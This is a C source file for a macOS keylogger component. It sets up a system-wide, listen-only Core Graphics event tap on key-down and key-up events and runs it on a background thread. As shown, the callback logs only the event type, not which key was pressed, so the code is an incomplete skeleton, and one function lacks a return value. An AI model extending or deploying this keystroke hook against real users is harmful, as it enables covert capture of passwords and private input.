/**
 * implementation of the key logger component
 *
 * @author d412vv1n
 */

#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include "keylogger.h"
#include "logger.h"
#include <ApplicationServices/ApplicationServices.h>
#include "/System/Library/Frameworks/IOKit.framework/Headers/IOKitLib.h"

static pthread_t thread;
static volatile int stopThread = 0;

CGEventRef keyTapCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
	log_debug("entered keyTapCallback()");

	if (type == kCGEventKeyDown) {
		log_info("key down: ");
	} else if (type == kCGEventKeyUp) {
		log_info("key up: ");
	}

	return NULL;
}

static int setUpRunLoop() {
	CFRunLoopRef runLoop;
	CFRunLoopSourceRef runLoopSource;
	CFMachPortRef tap;
	CGEventMask mask;

	log_debug("entered setUpRunLoop()");

	// set up the run loop
	runLoop = CFRunLoopGetCurrent();
	if (runLoop == NULL) {
		log_debug("could not get run loop");
		return 1;
	} else {
		log_debug("got run loop");
	}

	// set up the event tap
	mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
	tap = CGEventTapCreate(kCGAnnotatedSessionEventTap,
						   kCGHeadInsertEventTap,
						   kCGEventTapOptionListenOnly,
						   mask,
						   &keyTapCallback,
						   NULL);

	if (tap == NULL) {
		log_debug("could not create tap");
		return 1;
	}
	
	log_debug("tap created successfully");
	
	// add the event tap to the run loop
	runLoopSource = CFMachPortCreateRunLoopSource(NULL, tap, 0);
	CFRunLoopAddSource(runLoop, runLoopSource, kCFRunLoopCommonModes);
}

/**
 * the method used for the POSIX thread
 */
static void *runKeylogger(void *params) {
	log_debug("entered runKeylogger()");

	setUpRunLoop();

	int loopCounter = 1;
	do {
		log_debug("start run loop: %d. time", loopCounter);
        SInt32 result = CFRunLoopRunInMode(kCFRunLoopDefaultMode, 10, 1);
		loopCounter++;
	} while(!stopThread);

	return NULL;
}


int startKeylogger(void) {
	int threadErrorCode;
	
	log_debug("entered startKeylogger()");
	
	stopThread = 0;
	threadErrorCode = pthread_create(&thread, NULL, &runKeylogger, NULL);

	if (threadErrorCode) {
		return 1;
	}

	return 0;
}

int stopKeylogger(void) {
	log_debug("entered stopKeylogger()");

	stopThread = 1;

	return 0;
}
